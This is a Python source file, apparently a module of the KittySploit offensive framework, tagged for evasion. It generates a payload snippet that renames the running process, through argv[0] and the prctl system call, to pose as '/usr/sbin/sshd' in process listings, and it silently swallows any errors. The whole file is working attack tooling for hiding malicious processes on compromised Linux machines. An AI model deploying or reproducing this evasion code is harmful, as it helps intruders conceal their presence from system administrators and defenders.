#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Any, Dict

from kittysploit import *


class Module(Prestage):
    PRESTAGE_ID = "hide_argv"

    __info__ = {
        "name": "Hide Process argv (Python)",
        "description": "Replace process argv[0] with an innocuous name on Linux",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "platform": Platform.UNIX,
        "languages": ["python"],
        "dependencies": [],
        "tags": ["evasion", "prestage", "offline", "linux", "python"],
    }

    fake_name = OptString("/usr/sbin/sshd", "Process name shown in ps/top", False)

    def generate_python(self, context: Dict[str, Any] = None) -> str:
        fake = str(getattr(getattr(self, "fake_name", None), "value", self.fake_name) or "/usr/sbin/sshd")
        fake = fake.replace("\\", "\\\\").replace('"', '\\"')
        fake_short = fake[:15]
        return f"""
import sys
try:
    _fake = "{fake}"
    if hasattr(sys, "argv") and sys.argv:
        sys.argv[0] = _fake
    import ctypes
    _libc = ctypes.CDLL(None)
    if hasattr(_libc, "prctl"):
        _PR_SET_NAME = 15
        _buf = ("{fake_short}" + "\\0").encode()
        _libc.prctl(_PR_SET_NAME, _buf, 0, 0, 0)
except Exception:
    pass
""".strip()
